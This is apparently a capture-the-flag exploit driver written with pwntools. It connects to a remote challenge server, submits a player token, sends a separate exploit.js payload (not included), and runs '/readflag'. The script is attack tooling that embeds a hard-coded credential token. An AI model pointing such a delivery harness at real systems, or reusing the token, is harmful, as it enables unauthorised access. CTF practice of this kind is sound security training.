#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

LOCAL = 0

#  filename = "./pwn"
if LOCAL:
    pass
    #  p = process(filename)
else:
    remote_service = "202.38.93.111 10222"
    remote_service = remote_service.strip().split(" ")
    p = remote(remote_service[0], int(remote_service[1]))
#  e = ELF(filename, checksec=False)
#  l = ELF(e.libc.path, checksec=False)


rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
i2b = lambda c : str(c).encode()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
    if LOCAL:
        lg("p.pid")
        input()
    pass

debugPID()

ru(b'Please input your token: ')
sl(b'1119:MEUCIQDUCFthMiI3h5RpZfMZqW1G4wYw8CauHcL0KB6A0DbizgIgVq8QvPkUd9uVtFyjHGqW5p5K3toOCls8PhS5kqKE728=')

with open("./exploit.js", "r") as fd:
    sn(fd.read())

sl(b"<EOF>")
sl(b"/readflag")

irt()
